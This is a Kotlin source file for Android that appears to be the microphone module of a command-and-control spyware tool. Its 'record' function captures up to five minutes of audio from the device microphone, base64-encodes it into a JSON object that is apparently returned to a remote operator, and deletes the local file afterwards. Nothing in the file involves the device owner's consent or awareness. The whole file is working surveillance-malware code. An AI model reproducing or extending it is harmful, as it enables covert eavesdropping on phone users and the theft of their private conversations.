package com.outcome.c2

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Base64
import org.json.JSONObject
import java.io.File

object Audio {
    fun record(ctx: Context, seconds: Int): JSONObject {
        val out = File(ctx.cacheDir, "c2_mic_${System.currentTimeMillis()}.m4a")
        val rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()

        return try {
            rec.setAudioSource(MediaRecorder.AudioSource.MIC)
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            rec.setAudioEncodingBitRate(128_000)
            rec.setAudioSamplingRate(44_100)
            rec.setOutputFile(out.absolutePath)
            rec.prepare()
            rec.start()
            Thread.sleep(seconds.coerceIn(1, 300) * 1000L)
            rec.stop()
            rec.release()

            if (!out.exists()) return JSONObject().put("error", "no_output")
            val bytes = out.readBytes()
            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            out.delete()
            JSONObject()
                .put("format", "m4a")
                .put("duration", seconds)
                .put("size", bytes.size)
                .put("data_b64", b64)
        } catch (e: Exception) {
            runCatching { rec.release() }
            runCatching { out.delete() }
            JSONObject().put("error", e.message ?: "record_failed")
        }
    }
}
